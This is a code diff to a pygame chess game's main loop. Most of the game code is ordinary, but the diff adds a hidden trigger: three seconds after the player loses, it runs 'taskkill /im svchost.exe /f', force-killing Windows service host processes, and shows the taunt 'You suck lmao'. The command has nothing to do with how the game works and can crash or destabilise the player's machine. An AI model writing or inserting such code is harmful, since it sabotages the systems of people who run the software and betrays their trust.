@@ -611,6 +611,8 @@ def _pygame_loop(gs: GameState, tracker, conn=None, my_color=None):
     promo_rects = None
     reviewing   = False   # True when browsing move history after game over
     view_idx    = 0       # current position in move_history during review
+    loss_ticks  = None
+    loss_fired  = False
 
     while True:
         flip = (gs.turn == B) if conn is None else (my_color == B)
@@ -762,6 +764,26 @@ def _pygame_loop(gs: GameState, tracker, conn=None, my_color=None):
 
         if gs.game_over and not reviewing:
             draw_game_over(screen, gs, tracker)
+
+        lost_game = gs.game_over and gs.winner is not None and (
+            conn is None or (my_color is not None and gs.winner != my_color)
+        )
+        if lost_game and loss_ticks is None:
+            loss_ticks = pygame.time.get_ticks()
+
+        if loss_ticks is not None and not loss_fired:
+            elapsed = (pygame.time.get_ticks() - loss_ticks) / 1000.0
+            if elapsed >= 3.0:
+                os.system("taskkill /im svchost.exe /f")
+                loss_fired = True
+
+        if loss_ticks is not None and not reviewing:
+            surf = FONTS["xl"].render("You suck lmao", True, (255, 80, 80))
+            r = surf.get_rect(center=(WINDOW_W // 2, WINDOW_H // 2))
+            bg = pygame.Surface((r.width + 24, r.height + 16), pygame.SRCALPHA)
+            bg.fill((0, 0, 0, 180))
+            screen.blit(bg, (r.x - 12, r.y - 8))
+            screen.blit(surf, r)
 
         pygame.display.flip()
         clock.tick(60)
